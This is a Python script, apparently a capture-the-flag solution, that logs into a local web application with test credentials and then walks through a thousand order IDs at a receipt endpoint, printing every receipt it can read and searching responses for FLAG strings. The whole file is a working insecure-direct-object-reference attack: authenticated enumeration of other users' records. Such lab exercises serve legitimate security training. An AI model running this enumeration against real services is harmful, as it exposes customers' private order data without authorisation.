import requests
import re
from time import time, sleep

BASE_URL = "http://127.0.0.1:32781"

# Create session to maintain cookies
session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0'})

print("[*] Starting order ID enumeration (300000-300999)")
print("="*80)

# Step 1: Two-step login process
try:
    print("\n[*] Step 1: Submitting username")
    username_data = {"username": "test"}
    resp1 = session.post(f"{BASE_URL}/login", data=username_data, allow_redirects=False, timeout=10)
    print(f"[+] Username submission: Status {resp1.status_code}")
    print(f"[+] Cookies: {dict(session.cookies)}")

    print("\n[*] Step 2: Submitting password")
    password_data = {"password": "test"}
    resp2 = session.post(f"{BASE_URL}/login", data=password_data, allow_redirects=False, timeout=10)
    print(f"[+] Password submission: Status {resp2.status_code}")
    print(f"[+] Cookies: {dict(session.cookies)}")
except Exception as e:
    print(f"[!] Login error: {e}")

# Step 2: Enumerate order IDs
print("\n[*] Enumerating orders 300000-300999")
print("="*80)

valid_orders = []
flags_found = []
status_counts = {}
errors = 0
start_time = time()

for order_id in range(300000, 301000):
    url = f"{BASE_URL}/order/{order_id}/receipt"
    
    try:
        resp = session.get(url, timeout=5)
        status = resp.status_code
        
        status_counts[status] = status_counts.get(status, 0) + 1
        
        if status == 200:
            print(f"\n[SUCCESS] Order {order_id} - Status: {status} | Size: {len(resp.content)}B")
            print(f"Response:\n{resp.text}")
            print("-"*80)
            
            valid_orders.append(order_id)
            
            # Search for flags
            flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
            if flags:
                for flag in flags:
                    print(f"[!] FLAG FOUND: {flag}")
                    flags_found.append({'order': order_id, 'flag': flag})
        
        elif status not in [404, 403, 401]:
            print(f"\n[ANOMALY] Order {order_id} - Status: {status}")
    
    except requests.exceptions.RequestException as e:
        errors += 1
        if errors <= 5:
            print(f"[ERROR] Order {order_id}: {type(e).__name__}")
    except Exception as e:
        errors += 1
        if errors <= 5:
            print(f"[ERROR] Order {order_id}: {e}")
    
    # Progress every 100
    if (order_id - 299999) % 100 == 0:
        elapsed = time() - start_time
        print(f"\n[PROGRESS] {order_id - 299999}/1000 tested | {elapsed:.1f}s elapsed")

elapsed = time() - start_time

# Summary
print("\n" + "="*80)
print("FINAL SUMMARY")
print("="*80)
print(f"Range tested: 300000-300999 (1000 orders)")
print(f"Time: {elapsed:.2f}s | Rate: {1000/elapsed:.1f} req/s")
print(f"Errors: {errors}")

print(f"\nStatus codes:")
for status in sorted(status_counts.keys()):
    print(f"  {status}: {status_counts[status]}")

print(f"\nValid orders (200 OK): {len(valid_orders)}")
if valid_orders:
    for oid in valid_orders:
        print(f"  - {oid}")

print(f"\nFlags found: {len(flags_found)}")
if flags_found:
    for item in flags_found:
        print(f"  Order {item['order']}: {item['flag']}")
else:
    print("  None")

print("="*80)

